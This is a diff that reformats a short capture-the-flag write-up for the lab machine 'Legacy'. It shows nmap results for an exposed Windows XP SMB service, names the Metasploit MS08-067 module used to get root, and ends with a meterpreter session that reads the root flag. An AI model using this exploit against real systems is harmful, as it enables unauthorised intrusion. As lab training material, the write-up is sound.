@@ -1,23 +1,27 @@
-# Legacy
+# legacy
+
+## Legacy
 
 legacy was a really easy windows box that didnt involve much to do at all just simply a metasploit exploit for root
 
->skills involved in this box
-- enumeration
-- metasploit
+> skills involved in this box
+>
+> * enumeration
+> * metasploit
 
-# USER && ROOT
+## USER && ROOT
 
->nmap
-```bash
-Not shown: 997 filtered ports
-PORT     STATE  SERVICE       VERSION
-139/tcp  open   netbios-ssn   Microsoft Windows netbios-ssn
-445/tcp  open   microsoft-ds  Microsoft Windows XP microsoft-ds
-3389/tcp closed ms-wbt-server
-```
-Nmap only revealed 3 ports open a quick google search of the services running lead me to a metasploit module.
-`exploit/windows/smb/ms08_067_netapi` We use this and set rhosts and then simply just `exploit`
+> nmap
+>
+> ```bash
+> Not shown: 997 filtered ports
+> PORT     STATE  SERVICE       VERSION
+> 139/tcp  open   netbios-ssn   Microsoft Windows netbios-ssn
+> 445/tcp  open   microsoft-ds  Microsoft Windows XP microsoft-ds
+> 3389/tcp closed ms-wbt-server
+> ```
+>
+> Nmap only revealed 3 ports open a quick google search of the services running lead me to a metasploit module. `exploit/windows/smb/ms08_067_netapi` We use this and set rhosts and then simply just `exploit`
 
 Below i will show you all the commands i did as it was simply just change dirs and read the flags.
 
@@ -140,6 +144,8 @@ Mode              Size  Type  Last modified              Name
 100444/r--r--r--  32    fil   2017-03-16 02:18:19 -0400  root.txt
 
 meterpreter > cat root.txt
-993442d258b0e0ec917cae9e695d5713meterpreter > 
+993442d258b0e0ec917cae9e695d5713meterpreter >
 ```
+
 Thanks for reading hope you enjoyed.
+
